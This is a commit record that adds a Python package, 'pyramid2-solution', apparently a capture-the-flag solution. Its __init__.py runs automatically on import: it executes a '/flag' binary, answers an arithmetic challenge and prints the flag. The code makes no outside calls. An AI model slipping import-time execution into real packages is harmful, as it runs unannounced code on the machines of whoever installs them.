eca2c69a1374a50b3ff76618f4cd10a2fab556c3
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-07 00:07:18 +0000

    Add package pyramid2-solution/0.0.1/pyramid2_solution-0.0.1-py3-none-any.whl

---
+++ packages/pyramid2-solution/pyramid2_solution-0.0.1-py3-none-any.whl/pyramid2_solution/__init__.py
@@ -0,0 +1,25 @@
+# __init__.py
+import subprocess
+import re
+
+def get_flag():
+    try:
+        proc = subprocess.Popen(['/flag'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+        question = proc.stdout.readline()
+        print(question)
+
+        numbers = list(map(int, re.findall(r'\d+', question)))
+        if len(numbers) == 3:
+            A, B, C = numbers
+            answer = A * B + C
+            proc.stdin.write(f'{answer}\n')
+            proc.stdin.flush()
+            flag = proc.stdout.readline()
+            print(flag)
+        else:
+            print('Failed to parse question')
+    except FileNotFoundError:
+        print("The '/flag' binary was not found. Please ensure it is available.")
+
+# Call get_flag() upon import
+get_flag()
